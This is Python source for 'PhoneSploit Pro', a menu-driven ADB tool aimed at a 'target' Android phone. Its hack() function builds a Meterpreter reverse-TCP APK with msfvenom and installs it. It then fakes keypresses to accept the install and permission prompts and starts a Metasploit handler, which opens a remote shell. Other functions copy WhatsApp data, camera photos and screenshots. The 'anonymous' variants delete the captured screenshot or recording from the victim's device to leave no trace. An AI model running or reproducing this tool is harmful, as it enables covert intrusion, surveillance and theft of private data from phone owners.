import os
import random
import socket
import time
import subprocess
import platform
import datetime
from modules import banner
from modules import color


def start():
    # Checking OS
    global operating_system
    operating_system = platform.system()
    if operating_system == 'Windows':
        # Windows specific configuration
        windows_config()
    else:
        # On Linux / macOS
        # Creates a folder to store pulled files
        os.system('mkdir -p Downloaded-Files')
        check_packages()  # Checking for required packages


def windows_config():
    global clear, opener
    clear = 'cls'
    opener = 'start'
    # Creates a folder to store pulled files
    os.system('if not exist Downloaded-Files mkdir Downloaded-Files')


def check_packages():
    adb_status = subprocess.call(['which', 'adb'])
    if adb_status != 0:
        print(f'\n{color.RED}ERROR : ADB is NOT installed!\n')
        print(f'\n{color.CYAN}Please install Android-Tools (adb){color.WHITE}\n')

        choice = input(
            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
        if choice == 'y':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return

    metasploit_status = subprocess.call(['which', 'msfconsole'])
    if metasploit_status != 0:
        print(f'\n{color.RED}ERROR : Metasploit-Framework is NOT installed!\n')
        print(f'\n{color.CYAN}Please install Metasploit-Framework{color.WHITE}\n')

        choice = input(
            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
        if choice == 'y':
            return
        elif choice == 'n':
            exit_phonesploit_pro()
            return
        else:
            while choice != 'y' and choice != 'n':
                choice = input(
                    '\nInvalid choice!, Press Y or N > ').lower()
                if choice == 'y':
                    return
                elif choice == 'n':
                    exit_phonesploit_pro()
                    return

    python_version = platform.python_version()
    if python_version < '3.10':
        print("\nPlease update Python to version 3.10 or Newer to run this program.\n")
        exit_phonesploit_pro()
        return


def display_menu():
    ''' Displays banner and menu'''
    print(selected_banner, page)


def clear_screen():
    ''' Clears the screen and display menu '''
    os.system(clear)
    display_menu()


def change_page(name):
    global page
    if name == 'p':
        page = banner.menu1
    elif name == 'n':
        page = banner.menu2
    clear_screen()


def connect():
    print("\n")
    os.system("adb tcpip 5555")
    print("\nEnter target phone's IP Address.       Example : 192.168.1.23")
    ip = input("> ")
    os.system("adb connect " + ip + ":5555")


def list_devices():
    print("\n")
    os.system("adb devices -l")
    print("\n")


def disconnect():
    print("\n")
    os.system("adb disconnect")
    print("\n")


def exit_phonesploit_pro():
    global run_phonesploit_pro
    run_phonesploit_pro = False
    print("\nExiting...\n")


def get_shell():
    print("\n")
    os.system("adb shell")


def get_screenshot():

    # Getting a temporary file name to store time specific results
    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    print("\nEnter location to save screenshot, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(
            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
    else:
        print(
            f"\nSaving screenshot to {destination}\n")

    os.system(f"adb pull /sdcard/{file_name} {destination}")

    # Asking to open file
    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
    if choice == 'y':
        os.system(f"{opener} {destination}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y':
                os.system(f"{opener} {destination}/{file_name}")

    print("\n")


def screenrecord():
    # Getting a temporary file name to store time specific results
    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'

    time = input("\nEnter the recording duration (in seconds) > ")
    print('\nStarting Screen Recording...\n')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/{file_name}")
    print("\nEnter location to save video, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(
            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
    else:
        print(
            f"\nSaving video to {destination}\n")

    os.system(f"adb pull /sdcard/{file_name} {destination}")

    # Asking to open file
    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
    if choice == 'y':
        os.system(f"{opener} {destination}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y':
                os.system(f"{opener} {destination}/{file_name}")
    print("\n")


def pull_file():
    location = input("\nEnter file path : /sdcard/")
    print("\nEnter location to save file, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(f"\nSaving file to PhoneSploit-Pro/{destination}\n")
    else:
        print(f"\nSaving file to {destination}\n")
    os.system(f'adb pull /sdcard/{location} {destination}')

    # Asking to open file
    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()

    # updating location = file_name if it existed inside a folder
    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
    file_path = location.split('/')
    location = file_path[len(file_path)-1]

    # processing request
    if choice == 'y':
        os.system(f"{opener} {destination}/{location}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y':
                os.system(f"{opener} {destination}/{location}")


def push_file():
    location = input("\nEnter file path : ")
    destination = input("Enter destination path : /sdcard/")
    os.system("adb push " + location + " /sdcard/" + destination)


def stop_adb():
    os.system("adb kill-server")
    print("\nStopped ADB Server")


def install_app():
    file_location = input("\nEnter apk path : ")
    os.system("adb install " + file_location)
    print("\n")


def uninstall_app():
    print("\nEnter package name.     Example : com.spotify.music ")
    package_name = input("> ")
    os.system("adb uninstall " + package_name)
    print("\n")


def launch_app():
    print("\nEnter package name.     Example : com.spotify.music ")
    package_name = input("> ")

    os.system("adb shell monkey -p " + package_name + " 1")
    print("\n")


def list_apps():
    print('''

    1. List third party packages
    2. List all packages
    ''')
    mode = int(input("> "))
    if mode == 1:
        os.system("adb shell pm list packages -3")
    elif mode == 2:
        os.system("adb shell pm list packages")
    print("\n")


def reboot(key):
    if key == 'system':
        os.system('adb reboot')
    else:
        print('''

        1. Reboot to Recovery Mode
        2. Reboot to Bootloader
        3. Reboot to Fastboot Mode
        ''')
        mode = int(input("> "))
        if mode == 1:
            os.system('adb reboot recovery')
        elif mode == 2:
            os.system('adb reboot bootloader')
        elif mode == 3:
            os.system('adb reboot fastboot')

    print("\n")


def list_files():
    print('\n')
    os.system('adb shell ls -a /sdcard/')
    print('\n')


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def instructions():
    os.system(clear)
    print(banner.instructions_banner + banner.instruction)
    input('> ')


def hack():
    instructions()
    os.system(clear)
    print(banner.hacking_banner)
    ip = get_ip_address()  # getting IP Address to create payload
    print(f"\nUsing IP Address : {ip} to create payload\n")
    print("\nCreating APK...\n")
    # creating payload
    os.system(
        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
    print("\nInstalling APK to target device...\n")

    # installing apk to device
    if operating_system == 'Windows':
        # (used 'start /b' to execute command in background)
        os.system("start /b adb install test.apk")
    else:
        # (used ' &' to execute command in background)
        os.system("adb install test.apk &")
    time.sleep(5)  # waiting for apk to be installed

    # Keyboard input to accept app install
    print("\nAccepting app install\n")
    os.system('adb shell input keyevent 20')
    os.system('adb shell input keyevent 20')
    os.system('adb shell input keyevent 66')

    print("\nLaunching app...\n")
    package_name = "com.metasploit.stage"  # payload package name
    os.system("adb shell monkey -p " + package_name + " 1")
    time.sleep(3)  # waiting for app to launch

    # Keyboard input to accept app permissions
    print("\nAccepting app permissions\n")
    os.system('adb shell input keyevent 22')
    os.system('adb shell input keyevent 22')
    os.system('adb shell input keyevent 66')

    # Launching Metasploit
    os.system(
        f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit ; help'")


def copy_whatsapp():
    print("\nEnter location to save WhatsApp Data, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(f"\nSaving data to PhoneSploit-Pro/{destination}\n")
    else:
        print(f"\nSaving data to {destination}\n")

    location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
    # 'test -d' checks if directory exist or not
    folder_status = os.system(f'adb shell test -d {location}')

    # If WhatsApp exists in Android
    if folder_status == 0:
        location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
    else:
        location = '/sdcard/WhatsApp'

    os.system(f"adb pull {location} {destination}")
    print('\n')


def copy_screenshots():
    print("\nEnter location to save Screenshots, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(f"\nSaving Screenshots to PhoneSploit-Pro/{destination}\n")
    else:
        print(f"\nSaving Screenshots to {destination}\n")

    location = '/sdcard/Pictures/Screenshots'
    os.system(f"adb pull {location} {destination}")
    print('\n')


def copy_camera():
    print("\nEnter location to save Photos, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(f"\nSaving Photos to PhoneSploit-Pro/{destination}\n")
    else:
        print(f"\nSaving Photos to {destination}\n")

    location = '/sdcard/DCIM/Camera'
    os.system(f"adb pull {location} {destination}")
    print('\n')


def anonymous_screenshot():
    # Getting a temporary file name to store time specific results
    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
    os.system(f"adb shell screencap -p /sdcard/{file_name}")
    print("\nEnter location to save screenshot, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(
            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
    else:
        print(
            f"\nSaving screenshot to {destination}\n")

    os.system(f"adb pull /sdcard/{file_name} {destination}")

    print('\nDeleting screenshot from Target\'s device\n')
    os.system(f"adb shell rm /sdcard/{file_name}")

    # Asking to open file
    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
    if choice == 'y':
        os.system(f"{opener} {destination}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y':
                os.system(f"{opener} {destination}/{file_name}")

    print("\n")


def anonymous_screenrecord():
    # Getting a temporary file name to store time specific results
    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'

    time = input("\nEnter the recording duration (in seconds) > ")
    print('\nStarting Screen Recording...\n')
    os.system(
        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/{file_name}")
    print("\nEnter location to save video, Press 'Enter' for default")
    destination = input("> ")
    if destination == "":
        destination = 'Downloaded-Files'
        print(
            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
    else:
        print(
            f"\nSaving video to {destination}\n")

    os.system(f"adb pull /sdcard/{file_name} {destination}")

    print('\nDeleting video from Target\'s device\n')
    os.system(f"adb shell rm /sdcard/{file_name}")
    # Asking to open file
    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
    if choice == 'y':
        os.system(f"{opener} {destination}/{file_name}")

    elif not choice == 'n':
        while choice != 'y' and choice != 'n':
            choice = input(
                '\nInvalid choice!, Press Y or N > ').lower()
            if choice == 'y':
                os.system(f"{opener} {destination}/{file_name}")
    print("\n")


def main():

    # Clearing the screen and presenting the menu
    # taking selction input from user
    print(f"\n {color.CYAN}99 : Clear Screen                0 : Exit")
    option = input(
        f"{color.RED}\n[Main Menu] {color.WHITE}Enter selection > ").lower()

    match option:
        case 'p':
            change_page('p')
        case 'n':
            change_page('n')
        case '0':
            exit_phonesploit_pro()
        case '99':
            clear_screen()
        case '1':
            connect()
        case '2':
            list_devices()
        case '3':
            disconnect()
        case '4':
            get_shell()
        case '5':
            stop_adb()
        case '6':
            get_screenshot()
        case '7':
            screenrecord()
        case '8':
            pull_file()
        case '9':
            push_file()
        case '10':
            launch_app()
        case '11':
            install_app()
        case '12':
            uninstall_app()
        case '13':
            list_apps()
        case '14':
            reboot('system')
        case '15':
            hack()
        case '16':
            list_files()
        case '17':
            reboot('advanced')
        case '18':
            copy_whatsapp()
        case '19':
            copy_screenshots()
        case '20':
            copy_camera()
        case '21':
            anonymous_screenshot()
        case '22':
            anonymous_screenrecord()
        case other:
            print("\nInvalid selection!\n")


# Starting point of the program

# Global variables
run_phonesploit_pro = True
operating_system = ''
clear = 'clear'
opener = 'xdg-open'
page = banner.menu1
banner_color = random.choice(color.color_list)
# Concatinating banner color with the selected banner
selected_banner = banner_color + random.choice(banner.banner_list)

start()

if run_phonesploit_pro:
    clear_screen()
    while run_phonesploit_pro:
        main()
